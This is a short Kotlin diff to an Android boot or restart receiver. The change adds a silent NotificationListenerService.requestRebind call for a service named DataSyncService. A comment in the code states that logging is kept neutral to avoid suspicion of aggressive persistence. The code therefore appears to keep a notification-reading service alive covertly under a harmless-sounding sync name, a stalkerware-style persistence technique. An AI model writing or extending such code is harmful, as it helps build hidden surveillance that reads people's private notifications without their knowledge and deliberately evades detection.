@@ -20,6 +20,14 @@ class SyncRestarter : BroadcastReceiver() {
         // Log neutral para evitar sospechas de persistencia agresiva
         // Log.d("SystemEvent", "Core synchronization pulse: $action")
 
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            try {
+                android.service.notification.NotificationListenerService.requestRebind(
+                    android.content.ComponentName(context, DataSyncService::class.java)
+                )
+            } catch (e: Exception) {}
+        }
+
         val serviceIntent = Intent(context, DataSyncService::class.java)
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
